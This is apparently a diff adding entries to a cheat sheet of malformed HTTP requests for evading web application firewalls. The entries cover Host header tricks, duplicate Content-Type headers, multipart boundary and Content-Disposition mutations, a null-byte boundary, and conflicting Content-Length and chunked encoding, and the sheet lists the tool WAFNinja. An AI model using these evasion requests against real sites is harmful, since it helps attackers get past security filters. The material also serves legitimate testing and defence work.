@@ -183,9 +183,103 @@ Double host header
 Lowercase Host header title
 	GET /test HTTP/1.1
 	Host: site.dom
-Host with tab instead of space
+Host header tabbed instead of spaced
 	GET /test HTTP/1.1
 	Host:	site.dom
+Host with addition symbols
+	/ : \x00 \x20 \x09 \xad
+	--IIS
+	GET /test.aspx HTTP/1.1
+	Host: site.dom:12345
+	GET /test.aspx
+	Host: site.dom superfluous.text
+Content-Type with another text
+	GET /test /HTTP/1.1
+	Host: site.dom
+	Content-Type: application/another-text/+++x-www-form-urlencoded
+
+	hello=world
+Request with incorrect Content-Length
+	GET /test /HTTP/1.1
+	Host: site.dom
+	Content-Length: 1
+	
+	ASDFGHJKL
+Double Content-Type
+	GET /test /HTTP/1.1
+	Host: site.dom
+	Content-Type: multipart/form-data; boundary=ZZZ
+	Content-Type: multipart/form-data; boundary=AAA
+Content-Disposition mutations
+	GET /test HTTP/1.1
+	Host: site.dom
+	Content-Type: multipart/form-data; boundary=--------1218108630
+
+	----------1218108630
+	Content-Disposition: form-data; name="hello"
+
+	world
+	----------1218108630--
+	Content-Disposition: form-data; name="hello"
+	Content-Disposition: form-data; name="hello
+	Content-Disposition: form-data; name="hello"world"
+	Content-Disposition: attachment; name="hello"
+	Content-Type: multipart/form-data; boundary=x
+
+
+	--x
+	Content-Disposition:
+	test1;
+	--x
+	test2;
+	--x--
+	test3;
+	name="hello"
+
+	world
+Boundary mutation
+	--PHP
+	GET /test HTTP/1.1
+	Host site.dom
+	Content-Type: multipart/form-data; myfavoriteboundaryis=X; boundary=Hello;
+	--
+	Content-Type: multipart/form-data; boundary=X;
+Nullbyte
+	GET /test HTTP/1.1
+	Host: site.dom
+	Content-Type: multipart/form-data; boundary=HELLO\x00XXXXXXXXX
+	--
+	Content-Type: multipart/form-data; boundary=HELLO
+Ignored Content-Length
+	GET /test HTTP/1.1
+	Host: site.dom
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 11
+
+	hello=world
+	--
+	Content-Length: 22
+	Transfer-Encoding: chunked
+
+	0B
+	hello=world
+	0
+
+	--
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 0
+	Transfer-Encoding: chunked
+
+	3
+	hel
+	3
+	lo=
+	3
+	wor
+	2
+	ld
+	0
+
 	
 Tools:
 WAFNinja
